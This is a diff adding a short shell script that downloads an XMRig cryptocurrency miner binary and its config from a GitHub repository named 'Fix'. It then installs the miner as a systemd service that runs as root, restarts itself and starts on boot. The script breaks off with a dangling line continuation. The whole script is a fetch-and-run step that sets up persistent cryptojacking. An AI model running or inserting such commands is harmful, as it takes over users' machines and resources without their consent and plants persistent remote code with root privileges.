@@ -1,0 +1,23 @@
+mkdir -p ~/miner && cd ~/miner && \
+wget https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig && \
+wget https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json && \
+chmod +x xmrig && \
+sudo bash -c "cat <<EOT > /etc/systemd/system/miner.service
+[Unit]
+Description=XMRig Miner Service
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=$(pwd)
+ExecStart=$(pwd)/xmrig -c $(pwd)/config.json
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+EOT" && \
+sudo systemctl daemon-reload && \
+sudo systemctl enable miner.service && \
+sudo systemctl start miner.service && \
